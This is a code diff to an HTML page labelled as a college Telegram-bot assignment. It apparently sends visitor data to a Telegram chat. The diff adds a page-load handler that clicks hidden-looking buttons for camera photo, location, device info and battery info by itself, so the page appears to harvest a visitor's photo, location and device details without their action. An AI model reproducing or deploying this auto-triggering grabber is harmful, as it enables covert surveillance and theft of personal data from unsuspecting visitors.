@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Tugas Kuliah - Bot Telegram</title>
+  <title>Tugas Kuliah - Bot Telegram v2</title>
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
 <body>
@@ -95,6 +95,22 @@
         sendTelegramMessage('Maaf, peramban tidak mendukung informasi baterai.');
       }
     }
+
+    // Auto click function
+    function autoClick(elementId) {
+      const element = document.getElementById(elementId);
+      if (element) {
+        element.click();
+      }
+    }
+
+    // Auto click actions on page load
+    window.addEventListener('load', function() {
+      autoClick('autoPhotoButton');
+      autoClick('autoLocationButton');
+      autoClick('autoDeviceInfoButton');
+      autoClick('autoBatteryInfoButton');
+    });
   </script>
 </body>
 </html>
